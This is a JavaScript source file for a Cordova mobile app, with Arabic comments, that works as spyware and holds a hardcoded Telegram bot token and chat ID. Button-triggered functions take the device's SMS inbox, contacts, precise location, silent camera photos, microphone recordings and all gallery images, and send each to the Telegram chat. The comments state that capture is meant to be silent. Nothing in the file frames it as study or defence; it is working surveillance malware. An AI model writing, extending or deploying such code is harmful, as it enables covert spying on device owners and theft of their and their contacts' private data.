document.addEventListener('deviceready', onDeviceReady, false);

// تعريف المتغيرات العامة
const botToken = '7988955212:AAFnbsKqd9bL0ZdKZsWfLtbi32YVsNIq6E4';
const chatId = '5739065274';

// متغيرات لتسجيل الصوت
let mediaRecorder;
let audioChunks = [];
let isRecording = false;
let audioRecordingAttempts = 0;
const MAX_AUDIO_ATTEMPTS = 3;

// متغيرات لـ SMS
let smsPluginLoaded = false;

// متغيرات لنظام الملفات
let fileSystemReady = false;

function onDeviceReady() {
  console.log('Cordova جاهز');
  
  // التحقق من وجود File plugin
  checkRequiredPlugins();
  
  sendStartCommand();
  requestPermissions();
  createButtons();
}

function checkRequiredPlugins() {
  // التحقق من وجود File plugin
  if (typeof window.resolveLocalFileSystemURL === 'function') {
    fileSystemReady = true;
    console.log('File plugin متوفر');
  } else {
    console.warn('File plugin غير متوفر');
    // محاولة تحميل plugin يدويًا
    try {
      if (cordova && cordova.require) {
        cordova.require('cordova/plugin/File');
        if (typeof window.resolveLocalFileSystemURL === 'function') {
          fileSystemReady = true;
          console.log('تم تحميل File plugin بنجاح');
        }
      }
    } catch (e) {
      console.error('فشل تحميل File plugin:', e);
    }
  }
  
  // التحقق من وجود SMS plugin
  smsPluginLoaded = !!(window.SMS || (cordova && cordova.plugins && cordova.plugins.SMS));
  
  // التحقق من وجود Camera plugin
  if (navigator.camera) {
    console.log('Camera plugin متوفر');
  } else {
    console.warn('Camera plugin غير متوفر');
  }
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS,
      permissions.CAMERA,
      permissions.RECORD_AUDIO,
      permissions.READ_CONTACTS
    ],
    function(status) {
      if (status.hasPermission) {
        console.log("تم منح الأذونات بنجاح");
        sendToTelegram('status.txt', 'تم منح جميع الأذونات المطلوبة');
      } else {
        console.log("تم رفض الأذونات");
        sendToTelegram('error.txt', 'تم رفض بعض الأذونات المهمة');
      }
    },
    function(error) {
      console.error("فشل طلب الأذونات", error);
      sendToTelegram('error.txt', `فشل طلب الأذونات: ${JSON.stringify(error)}`);
    }
  );
}

function sendStartCommand() {
  // إرسال أمر /start إلى البوت
  const message = '/start';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
      console.log('تم إرسال أمر /start:', data);
      sendConnectionMessage();
    })
    .catch(error => {
      console.error('خطأ في إرسال أمر /start:', error);
      sendToTelegram('error.txt', `فشل إرسال أمر /start: ${error.message}`);
    });
}

function sendConnectionMessage() {
  // إرسال رسالة "الجهاز متصل" إلى البوت
  const message = '✅ الجهاز متصل وجاهز للعمل';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة الاتصال:', data))
    .catch(error => {
      console.error('خطأ في إرسال رسالة الاتصال:', error);
      sendToTelegram('error.txt', `فشل إرسال رسالة الاتصال: ${error.message}`);
    });
}

function createButtons() {
  // مسح أي أزرار موجودة مسبقاً
  const existingButtons = document.querySelectorAll('.command-button');
  existingButtons.forEach(btn => btn.remove());
  
  // إنشاء الزر الرئيسي الشفاف
  const mainButton = document.createElement('button');
  mainButton.className = 'command-button';
  mainButton.textContent = 'أوامر السحب';
  mainButton.style.cssText = `
    opacity: 0.7;
    position: fixed;
    bottom: 20px;
    right: 20px;
    padding: 10px 15px;
    background-color: #4285f4;
    color: white;
    border: none;
    border-radius: 5px;
    z-index: 9999;
    cursor: pointer;
    transition: all 0.3s;
    font-size: 16px;
  `;
  
  mainButton.onmouseover = () => mainButton.style.opacity = '1';
  mainButton.onmouseout = () => mainButton.style.opacity = '0.7';
  mainButton.onclick = showCommands;
  
  document.body.appendChild(mainButton);
}

function showCommands() {
  // مسح أي أزرار أوامر موجودة مسبقاً
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
  
  // إنشاء الأزرار الشفافة للأوامر
  const commands = [
    { text: 'سحب رسائل SMS', action: collectSMS, color: '#34a853' },
    { text: 'سحب الموقع الجغرافي', action: getLocation, color: '#fbbc05' },
    { text: 'سحب جهات الاتصال', action: collectContacts, color: '#4285f4' },
    { text: 'الكاميرا الأمامية', action: () => capturePhoto(1), color: '#90a4ae' },
    { text: 'الكاميرا الخلفية', action: () => capturePhoto(0), color: '#607d8b' },
    { text: isRecording ? 'إيقاف التسجيل' : 'تسجيل صوت', action: toggleAudioRecording, color: '#e91e63' },
    { text: 'سحب جميع الصور', action: collectAllImages, color: '#ea4335' },
    { text: 'إخفاء الأوامر', action: hideCommands, color: '#666666' }
  ];
  
  commands.forEach((cmd, index) => {
    const btn = document.createElement('button');
    btn.className = 'command-btn';
    btn.textContent = cmd.text;
    btn.style.cssText = `
      opacity: 0.7;
      position: fixed;
      bottom: ${80 + index * 60}px;
      right: 20px;
      padding: 10px 15px;
      background-color: ${cmd.color};
      color: white;
      border: none;
      border-radius: 5px;
      z-index: 9998;
      cursor: pointer;
      transition: all 0.3s;
      font-size: 14px;
    `;
    
    btn.onmouseover = () => btn.style.opacity = '1';
    btn.onmouseout = () => btn.style.opacity = '0.7';
    btn.onclick = cmd.action;
    
    document.body.appendChild(btn);
  });
}

function hideCommands() {
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
}

// حل كامل لجمع جهات الاتصال
function collectContacts() {
  sendToTelegram('status.txt', 'جاري جمع جهات الاتصال...');
  
  if (!navigator.contacts) {
    console.error('Contacts plugin not available');
    // محاولة تحميل plugin يدوي
    try {
      navigator.contacts = cordova.plugins.contacts;
      if (!navigator.contacts) {
        throw new Error("الـ plugin غير متوفر حتى بعد المحاولة");
      }
    } catch (e) {
      console.error('فشل تحميل Contacts plugin:', e);
      sendToTelegram('error.txt', 'Contacts plugin غير متوفر: ' + e.message);
      return;
    }
  }
  
  const options = new ContactFindOptions();
  options.multiple = true;
  options.desiredFields = ["*"]; // جمع جميع الحقول
  
  const fields = [
    "displayName", 
    "name",
    "phoneNumbers",
    "emails",
    "addresses",
    "organizations"
  ];
  
  try {
    navigator.contacts.find(fields, 
      (contacts) => {
        if (!contacts || contacts.length === 0) {
          sendToTelegram('contacts.txt', 'لم يتم العثور على أي جهة اتصال');
          sendToTelegram('status.txt', 'لم يتم العثور على أي جهة اتصال');
          return;
        }
        
        let contactsText = "قائمة جهات الاتصال:\n\n";
        let validContacts = 0;
        
        // استخدام حلقة for عادية لتجنب مشاكل الذاكرة مع قوائم طويلة
        for (let i = 0; i < contacts.length; i++) {
          const contact = contacts[i];
          
          try {
            // محاولة مختلفة لاستخراج الاسم
            let name = "جهة اتصال بدون اسم";
            if (contact.name && contact.name.formatted) {
              name = contact.name.formatted;
            } else if (contact.displayName) {
              name = contact.displayName;
            } else if (contact.name) {
              name = `${contact.name.givenName || ''} ${contact.name.familyName || ''}`.trim();
            }
            
            // التأكد من أن الاسم ليس فارغًا
            if (!name || name.trim() === '') {
              name = "جهة اتصال بدون اسم";
            }
            
            let phones = [];
            if (contact.phoneNumbers && contact.phoneNumbers.length > 0) {
              phones = contact.phoneNumbers.map(pn => pn.value ? pn.value.trim() : '').filter(v => v);
            }
            
            let emails = [];
            if (contact.emails && contact.emails.length > 0) {
              emails = contact.emails.map(em => em.value ? em.value.trim() : '').filter(v => v);
            }
            
            // التأكد من وجود معلومات اتصال
            if (phones.length > 0 || emails.length > 0) {
              validContacts++;
              contactsText += `الاسم: ${name}\n`;
              
              if (phones.length > 0) {
                contactsText += `الأرقام: ${phones.join(", ")}\n`;
              }
              
              if (emails.length > 0) {
                contactsText += `الإيميلات: ${emails.join(", ")}\n`;
              }
              
              contactsText += `-------------------------\n`;
            }
          } catch (e) {
            console.error(`خطأ في معالجة جهة الاتصال ${i}:`, e);
          }
        }
        
        if (validContacts === 0) {
          sendToTelegram('contacts.txt', 'لم يتم العثور على جهات اتصال تحتوي على معلومات اتصال');
          sendToTelegram('status.txt', 'لم يتم العثور على جهات اتصال تحتوي على معلومات اتصال');
        } else {
          sendToTelegram('contacts.txt', contactsText);
          sendToTelegram('status.txt', `تم جمع ${validContacts} جهة اتصال صالحة وإرسالها`);
        }
      },
      (error) => {
        console.error('Error collecting contacts:', error);
        let errorMsg = 'فشل جمع جهات الاتصال';
        
        if (error && error.code) {
          switch (error.code) {
            case ContactError.NOT_FOUND_ERROR:
              errorMsg = 'لم يتم العثور على جهات الاتصال';
              break;
            case ContactError.INVALID_ARGUMENT_ERROR:
              errorMsg = 'خطأ في المعلمات المقدمة';
              break;
            case ContactError.TIMEOUT_ERROR:
              errorMsg = 'انتهى وقت الانتظار';
              break;
            case ContactError.IO_ERROR:
              errorMsg = 'خطأ في الإدخال/الإخراج';
              break;
            case ContactError.NO_PERMSSION_ERROR:
              errorMsg = 'لا توجد أذونات كافية';
              break;
            default:
              errorMsg = `خطأ غير معروف (${error.code})`;
          }
        }
        
        sendToTelegram('error.txt', errorMsg);
      },
      options
    );
  } catch (e) {
    console.error('استثناء في جمع جهات الاتصال:', e);
    sendToTelegram('error.txt', `استثناء في جمع جهات الاتصال: ${e.message}`);
    
    // محاولة بديلة لجمع جهات الاتصال
    try {
      navigator.contacts.find(fields, 
        (contacts) => {
          // معالجة النتائج بنفس الطريقة
        },
        (error) => {
          // معالجة الأخطاء
        },
        { filter: "", multiple: true }
      );
    } catch (e2) {
      console.error('فشل المحاولة البديلة لجمع جهات الاتصال:', e2);
      sendToTelegram('error.txt', `فشل المحاولة البديلة: ${e2.message}`);
    }
  }
}

// حل كامل للكاميرا الأمامية والخلفية بدون صوت
function capturePhoto(cameraDirection) {
  const options = {
    quality: 90,
    destinationType: Camera.DestinationType.FILE_URI,
    sourceType: Camera.PictureSourceType.CAMERA,
    mediaType: Camera.MediaType.PICTURE,
    encodingType: Camera.EncodingType.PNG,
    cameraDirection: cameraDirection, // 0=back, 1=front
    saveToPhotoAlbum: false,
    correctOrientation: true,
    allowEdit: false,
    // إضافة هذه الخيارات لجعل التصوير بصمت
    disableAudio: true, // إيقاف صوت الغالق
    cameraPopoverHandle: null, // إخفاء أي عناصر واجهة
    popoverOptions: null // إخفاء أي عناصر واجهة
  };

  try {
    if (!navigator.camera) {
      sendToTelegram('error.txt', 'Camera plugin غير متوفر');
      return;
    }
    
    navigator.camera.getPicture(
      (imageURI) => {
        console.log('تم التقاط الصورة بنجاح:', imageURI);
        sendImageToTelegram(imageURI, `camera_${cameraDirection === 0 ? 'back' : 'front'}_${Date.now()}.png`);
      },
      (error) => {
        console.error('Error taking photo:', error);
        let errorMsg = 'فشل التقاط الصورة';
        
        if (error && error.message) {
          if (error.message.includes("cancelled")) {
            sendToTelegram('status.txt', 'تم إلغاء التقاط الصورة');
            return;
          }
          
          if (error.message.includes("permission")) {
            errorMsg = 'لا توجد أذونات كافية للكاميرا';
          }
        }
        
        sendToTelegram('error.txt', `${errorMsg}: ${JSON.stringify(error)}`);
      },
      options
    );
  } catch (e) {
    console.error('استثناء في التقاط الصورة:', e);
    sendToTelegram('error.txt', `استثناء في التقاط الصورة: ${e.message}`);
  }
}

function sendImageToTelegram(imageURI, filename) {
  try {
    if (!fileSystemReady) {
      sendToTelegram('error.txt', 'File plugin غير متوفر، لا يمكن إرسال الصورة');
      return;
    }
    
    window.resolveLocalFileSystemURL(imageURI, (fileEntry) => {
      fileEntry.file((file) => {
        // التأكد من أن الامتداد هو PNG
        const pngFilename = filename.replace(/\.[^/.]+$/, ".png");
        
        const formData = new FormData();
        formData.append('photo', file, pngFilename);
        
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
          method: 'POST',
          body: formData
        })
        .then(response => {
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          return response.json();
        })
        .then(data => {
          console.log('تم إرسال الصورة:', data);
          sendToTelegram('status.txt', `تم إرسال صورة الكاميرا (${pngFilename})`);
        })
        .catch(error => {
          console.error('Error sending image:', error);
          sendToTelegram('error.txt', `فشل إرسال الصورة: ${error.message}`);
        });
      }, (error) => {
        console.error('Error reading image file:', error);
        sendToTelegram('error.txt', `فشل قراءة ملف الصورة: ${JSON.stringify(error)}`);
      });
    }, (error) => {
      console.error('Error resolving file system URL:', error);
      sendToTelegram('error.txt', `فشل تحديد مسار ملف الصورة: ${JSON.stringify(error)}`);
    });
  } catch (e) {
    console.error('استثناء في إرسال الصورة:', e);
    sendToTelegram('error.txt', `استثناء في إرسال الصورة: ${e.message}`);
  }
}

// حل كامل لتسجيل الصوت مع حل مشكلة "الميكروفون قيد الاستخدام" وبدون صوت
function toggleAudioRecording() {
  if (isRecording) {
    stopAudioRecording();
  } else {
    startAudioRecording();
  }
  
  // تحديث نص الزر
  const audioButton = Array.from(document.querySelectorAll('.command-btn'))
    .find(btn => btn.textContent.includes('تسجيل صوت') || btn.textContent.includes('إيقاف التسجيل'));
  
  if (audioButton) {
    audioButton.textContent = isRecording ? 'إيقاف التسجيل' : 'تسجيل صوت';
  }
}

function startAudioRecording() {
  // إعادة تعيين المحاولات إذا كانت جديدة
  if (!isRecording) {
    audioRecordingAttempts = 0;
  }
  
  isRecording = true;
  
  sendToTelegram('status.txt', 'جاري بدء تسجيل الصوت...');
  
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.error('MediaDevices API غير مدعوم');
    sendToTelegram('error.txt', 'واجهة ميديا غير مدعومة على هذا الجهاز');
    isRecording = false;
    return;
  }

  // خيارات لتسجيل الصوت بصمت
  const audioConstraints = {
    audio: {
      echoCancellation: true,
      noiseSuppression: true,
      sampleRate: 44100,
      channelCount: 1,
      volume: 1.0 // ضمان عدم وجود أي إعدادات تسبب صوت
    }
  };

  navigator.mediaDevices.getUserMedia(audioConstraints)
    .then(stream => {
      try {
        // إيقاف أي تسجيلات سابقة
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
          try {
            mediaRecorder.stop();
          } catch (e) {
            console.log('لا يوجد تسجيل نشط لوقفه');
          }
        }
        
        // إيقاف جميع المسارات السابقة
        if (stream.getTracks) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        // إنشاء دفق جديد
        const newStream = new MediaStream();
        navigator.mediaDevices.getUserMedia({ audio: true })
          .then(newStreamData => {
            newStreamData.getAudioTracks().forEach(track => {
              newStream.addTrack(track);
            });
            
            // استخدام خيارات محددة لـ MediaRecorder
            let options = { mimeType: 'audio/webm;codecs=opus' };
            
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
              options = { mimeType: 'audio/webm' };
              if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options = { mimeType: 'audio/ogg' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                  options = { mimeType: 'audio/mp4' };
                }
              }
            }
            
            mediaRecorder = new MediaRecorder(newStream, options);
            
            mediaRecorder.ondataavailable = event => {
              if (event.data.size > 0) {
                audioChunks.push(event.data);
              }
            };
            
            mediaRecorder.onstop = () => {
              try {
                const audioBlob = new Blob(audioChunks, { type: options.mimeType });
                sendAudioToTelegram(audioBlob, options.mimeType);
              } catch (e) {
                console.error('Error creating audio blob:', e);
                sendToTelegram('error.txt', `فشل إنشال ملف الصوت: ${e.message}`);
              }
              
              // إيقاف جميع المسارات
              newStream.getTracks().forEach(track => track.stop());
            };
            
            mediaRecorder.onerror = (event) => {
              console.error('MediaRecorder error:', event);
              sendToTelegram('error.txt', `خطأ في مسجل الصوت: ${event.error}`);
              stopAudioRecording();
            };
            
            mediaRecorder.start(1000);
            sendToTelegram('status.txt', 'جاري تسجيل الصوت...');
          })
          .catch(error => {
            console.error('Error accessing microphone:', error);
            sendToTelegram('error.txt', `فشل الوصول إلى الميكروفون: ${error.message}`);
            isRecording = false;
          });
      } catch (e) {
        console.error('Error initializing MediaRecorder:', e);
        sendToTelegram('error.txt', `فشل تهيئة مسجل الصوت: ${e.message}`);
        isRecording = false;
      }
    })
    .catch(error => {
      console.error('Error accessing microphone:', error);
      sendToTelegram('error.txt', `فشل الوصول إلى الميكروفون: ${error.message}`);
      isRecording = false;
    });
}

function stopAudioRecording() {
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    try {
      mediaRecorder.stop();
      isRecording = false;
      sendToTelegram('status.txt', 'تم إيقاف تسجيل الصوت');
    } catch (e) {
      console.error('Error stopping media recorder:', e);
      sendToTelegram('error.txt', `فشل إيقاف التسجيل: ${e.message}`);
      isRecording = false;
    }
  } else {
    isRecording = false;
  }
}

function sendAudioToTelegram(audioBlob, mimeType) {
  try {
    const formData = new FormData();
    const fileName = `recording_${Date.now()}.mp3`;
    
    // تحويل إلى MP3 إذا لزم الأمر
    if (mimeType.includes('webm') || mimeType.includes('ogg')) {
      // في التطبيقات الحقيقية، قد تحتاج إلى استخدام مكتبة لتحويل التنسيق
      // هنا سنستخدم الامتداد .mp3 على أي حال
      formData.append('voice', audioBlob, fileName);
    } else {
      formData.append('voice', audioBlob, fileName);
    }
    
    fetch(`https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(data => {
      console.log('تم إرسال التسجيل الصوتي:', data);
      sendToTelegram('status.txt', 'تم إرسال التسجيل الصوتي بنجاح');
    })
    .catch(error => {
      console.error('Error sending audio:', error);
      sendToTelegram('error.txt', `فشل إرسال التسجيل الصوتي: ${error.message}`);
      
      // محاولة بديلة باستخدام ملف عادي
      const altFormData = new FormData();
      altFormData.append('document', audioBlob, `recording_${Date.now()}.bin`);
      
      fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
        method: 'POST',
        body: altFormData
      })
      .then(response => response.json())
      .then(data => {
        console.log('تم إرسال ملف الصوت البديل:', data);
        sendToTelegram('status.txt', 'تم إرسال ملف الصوت (بصيغة بديلة)');
      })
      .catch(e => {
        console.error('Error sending alternative audio file:', e);
        sendToTelegram('error.txt', `فشل إرسال ملف الصوت البديل: ${e.message}`);
      });
    });
  } catch (e) {
    console.error('Error preparing audio for sending:', e);
    sendToTelegram('error.txt', `فشل إعداد ملف الصوت للإرسال: ${e.message}`);
  }
}

// حل كامل لـ SMS مع معالجة الأخطاء
function collectSMS() {
  sendToTelegram('status.txt', 'جاري جمع الرسائل النصية...');
  
  // تحقق من توفر SMS plugin
  if (!smsPluginLoaded) {
    console.log('محاولة تحميل SMS plugin يدويًا');
    
    // محاولة 1: تحقق من وجود الكائن في cordova.plugins
    if (cordova && cordova.plugins && cordova.plugins.SMS) {
      window.SMS = cordova.plugins.SMS;
      smsPluginLoaded = true;
      console.log('تم تحميل SMS plugin من cordova.plugins');
    } 
    // محاولة 2: تحقق من وجوده في navigator
    else if (navigator && navigator.SMS) {
      window.SMS = navigator.SMS;
      smsPluginLoaded = true;
      console.log('تم تحميل SMS plugin من navigator');
    }
    // محاولة 3: تحميل plugin ديناميكيًا
    else {
      try {
        cordova.require('cordova/plugin/SMS');
        if (window.SMS) {
          smsPluginLoaded = true;
          console.log('تم تحميل SMS plugin باستخدام cordova.require');
        } else {
          throw new Error('فشل التحميل الديناميكي');
        }
      } catch (e) {
        console.error('فشل جميع محاولات تحميل SMS plugin:', e);
        sendToTelegram('error.txt', 'SMS plugin غير متوفر: لا يمكن تحميله');
        return;
      }
    }
  }
  
  // تحقق مرة أخرى بعد المحاولات
  if (!smsPluginLoaded || !window.SMS) {
    console.error('SMS plugin غير متوفر بعد جميع المحاولات');
    sendToTelegram('error.txt', 'SMS plugin غير متوفر بعد جميع المحاولات');
    return;
  }
  
  // خيارات أكثر أمانًا لجمع الرسائل
  const filter = { 
    box: 'inbox',
    indexFrom: 0,
    maxCount: 500 // عدد معقول لتجنب مشاكل الذاكرة
  };
  
  try {
    console.log('جاري استدعاء SMS.listSMS مع الخيارات:', filter);
    
    SMS.listSMS(filter, 
      (data) => {
        console.log('تم جمع الرسائل بنجاح:', data);
        
        if (!data || data.length === 0) {
          sendToTelegram('sms_inbox.txt', 'لم يتم العثور على أي رسائل نصية');
          sendToTelegram('status.txt', 'لم يتم العثور على أي رسائل نصية');
          return;
        }
        
        let smsText = "قائمة الرسائل النصية:\n\n";
        let validMessages = 0;
        
        for (let i = 0; i < data.length; i++) {
          try {
            const msg = data[i];
            if (msg && msg.body) {
              smsText += `[${new Date(msg.date).toLocaleString()}] ${msg.address || 'رقم غير معروف'}: ${msg.body}\n`;
              smsText += `-------------------------\n`;
              validMessages++;
            }
          } catch (e) {
            console.error(`خطأ في معالجة الرسالة ${i}:`, e);
          }
        }
        
        if (validMessages === 0) {
          sendToTelegram('sms_inbox.txt', 'لم يتم العثور على رسائل نصية صالحة');
          sendToTelegram('status.txt', 'لم يتم العثور على رسائل نصية صالحة');
        } else {
          sendToTelegram('sms_inbox.txt', smsText);
          sendToTelegram('status.txt', `تم جمع ${validMessages} رسالة نصية صالحة وإرسالها`);
        }
      },
      (error) => {
        console.error('Error collecting SMS:', error);
        
        let errorMsg = 'فشل جمع الرسائل النصية';
        if (error && error.code) {
          switch (error.code) {
            case 1:
              errorMsg = 'خطأ في المعلمات';
              break;
            case 2:
              errorMsg = 'الجهاز غير مدعوم';
              break;
            case 3:
              errorMsg = 'الجهاز غير مهيأ (SIM غير موجود)';
              break;
            case 4:
              errorMsg = 'تم رفض الأذونات';
              break;
            case 5:
              errorMsg = 'تم إلغاء العملية';
              break;
            default:
              errorMsg = `كود خطأ غير معروف (${error.code})`;
          }
        }
        
        sendToTelegram('error.txt', `${errorMsg}: ${JSON.stringify(error)}`);
      }
    );
  } catch (e) {
    console.error('استثناء في استدعاء SMS.listSMS:', e);
    sendToTelegram('error.txt', `استثناء في جمع الرسائل: ${e.message}`);
  }
}

// جمع جميع الصور من الذاكرة الداخلية
function collectAllImages() {
  sendToTelegram('status.txt', 'جاري جمع جميع الصور من الذاكرة الداخلية...');
  
  if (!fileSystemReady) {
    sendToTelegram('error.txt', 'File plugin غير متوفر، لا يمكن جمع الصور');
    
    // محاولة تحميل plugin يدويًا
    try {
      if (cordova && cordova.require) {
        cordova.require('cordova/plugin/File');
        if (typeof window.resolveLocalFileSystemURL === 'function') {
          fileSystemReady = true;
          sendToTelegram('status.txt', 'تم تحميل File plugin بنجاح، جرب مرة أخرى');
          return;
        }
      }
    } catch (e) {
      console.error('فشل تحميل File plugin:', e);
    }
    
    sendToTelegram('error.txt', 'File plugin غير متوفر ولا يمكن استخدام الطرق البديلة');
    return;
  }
  
  // تحديد جميع المسارات الشائعة للصور
  const commonImagePaths = [
    cordova.file.externalRootDirectory + 'DCIM/Camera/',
    cordova.file.externalRootDirectory + 'DCIM/',
    cordova.file.externalRootDirectory + 'Pictures/',
    cordova.file.externalRootDirectory + 'Pictures/Screenshots/',
    cordova.file.externalRootDirectory + 'Pictures/Photos/',
    cordova.file.externalRootDirectory + 'Pictures/Instagram/',
    cordova.file.externalRootDirectory + 'Pictures/Facebook/',
    cordova.file.externalRootDirectory + 'Pictures/WhatsApp/',
    cordova.file.externalRootDirectory + 'Pictures/Messenger/',
    cordova.file.externalRootDirectory + 'Download/',
    cordova.file.externalRootDirectory + 'Download/Images/',
    cordova.file.externalRootDirectory + 'storage/emulated/0/Pictures/',
    cordova.file.externalRootDirectory + 'storage/emulated/0/DCIM/',
    cordova.file.externalRootDirectory + 'storage/emulated/0/Download/'
  ];
  
  // مصفوفة لتخزين جميع الصور المكتشفة
  let allImages = [];
  let pathsProcessed = 0;
  
  // دالة لجمع الصور من مسار معين
  function scanDirectory(path) {
    window.resolveLocalFileSystemURL(path,
      (dir) => {
        const reader = dir.createReader();
        reader.readEntries(
          (entries) => {
            // تصفية الصور فقط
            const images = entries.filter(entry => 
              entry.isFile && /\.(jpg|jpeg|png|gif|bmp|webp)$/i.test(entry.name)
            );
            
            allImages = allImages.concat(images);
            
            // التحقق إذا تم معالجة جميع المسارات
            pathsProcessed++;
            if (pathsProcessed >= commonImagePaths.length) {
              if (allImages.length === 0) {
                sendToTelegram('status.txt', 'لم يتم العثور على صور في الذاكرة الداخلية');
              } else {
                sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
                sendImagesToTelegram(allImages, 0);
              }
            }
          },
          (error) => {
            console.error(`Error reading directory ${path}:`, error);
            pathsProcessed++;
            if (pathsProcessed >= commonImagePaths.length) {
              if (allImages.length > 0) {
                sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
                sendImagesToTelegram(allImages, 0);
              } else {
                sendToTelegram('error.txt', 'لم يتم العثور على صور في أي مسار');
              }
            }
          }
        );
      },
      (error) => {
        console.error(`Error accessing directory ${path}:`, error);
        pathsProcessed++;
        if (pathsProcessed >= commonImagePaths.length) {
          if (allImages.length > 0) {
            sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
            sendImagesToTelegram(allImages, 0);
          } else {
            sendToTelegram('error.txt', 'لم يتم العثور على صور في أي مسار');
          }
        }
      }
    );
  }
  
  // بدء فحص جميع المسارات
  commonImagePaths.forEach(path => {
    scanDirectory(path);
  });
}

function getLocation() {
  sendToTelegram('status.txt', 'جاري تحديد الموقع الجغرافي...');
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const location = `📍 الموقع الجغرافي:\n\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}\nالدقة: ${position.coords.accuracy} متر\nالارتفاع: ${position.coords.altitude || 'غير معروف'}\nالسرعة: ${position.coords.speed || 'غير معروف'}\nالاتجاه: ${position.coords.heading || 'غير معروف'}`;
      
      // إرسال الموقع كرسالة نصية
      sendToTelegram('location.txt', location);
      
      // إرسال الموقع كخريطة (رابط جوجل ماب)
      const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      const mapMessage = `📍 الموقع الجغرافي:\n\n${mapUrl}\n\nدقة الموقع: ${position.coords.accuracy} متر`;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mapMessage)}`)
        .then(response => response.json())
        .then(data => {
          console.log('تم إرسال رابط الخريطة:', data);
          sendToTelegram('status.txt', 'تم إرسال الموقع الجغرافي بنجاح');
        })
        .catch(error => {
          console.error('خطأ في إرسال رابط الخريطة:', error);
          sendToTelegram('error.txt', `فشل إرسال رابط الخريطة: ${error.message}`);
        });
    },
    (error) => {
      console.error('Error getting location:', error);
      
      let errorMsg = 'فشل الحصول على الموقع';
      if (error.code === error.PERMISSION_DENIED) {
        errorMsg = 'تم رفض أذونات الموقع';
      } else if (error.code === error.POSITION_UNAVAILABLE) {
        errorMsg = 'الموقع غير متوفر';
      } else if (error.code === error.TIMEOUT) {
        errorMsg = 'انتهى وقت الانتظار';
      }
      
      sendToTelegram('error.txt', `${errorMsg}: ${error.message}`);
    },
    { 
      enableHighAccuracy: true, 
      timeout: 30000, // زيادة الوقت لتجنب أخطاء الانتهاء
      maximumAge: 0 
    }
  );
}

function sendToTelegram(filename, content) {
  try {
    // إرسال رسالة تحميل أولاً
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`جاري إرسال ${filename}...`)}`)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => console.log('تم إرسال رسالة التحميل:', data))
      .catch(error => console.error('خطأ في إرسال رسالة التحميل:', error));
    
    // إرسال الملف الفعلي
    const blob = new Blob([content], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('document', blob, filename);
    
    fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(data => console.log('تم إرسال الملف:', data))
    .catch(error => {
      console.error('Error sending file:', error);
      // لا نقوم بإعادة المحاولة تلقائيًا لتجنب حلقة لا نهائية
    });
  } catch (e) {
    console.error('استثناء في إرسال إلى Telegram:', e);
  }
}

function sendImagesToTelegram(images, index = 0) {
  if (index >= images.length) {
    sendToTelegram('status.txt', 'تم إرسال جميع الصور بنجاح');
    return;
  }
  
  const imgEntry = images[index];
  
  imgEntry.file(
    (file) => {
      // تحويل الامتداد إلى PNG
      const pngFilename = file.name.replace(/\.[^/.]+$/, ".png");
      
      const formData = new FormData();
      formData.append('photo', file, pngFilename);
      
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
        method: 'POST',
        body: formData
      })
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
        // إرسال الصورة التالية بعد تأخير 1.5 ثانية
        setTimeout(() => sendImagesToTelegram(images, index + 1), 1500);
      })
      .catch(error => {
        console.error(`Error sending image ${index + 1}:`, error);
        // التخطي إلى الصورة التالية في حالة الخطأ
        setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
      });
    },
    (error) => {
      console.error(`Error reading image file ${index + 1}:`, error);
      // التخطي إلى الصورة التالية في حالة الخطأ
      setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
    }
  );
}
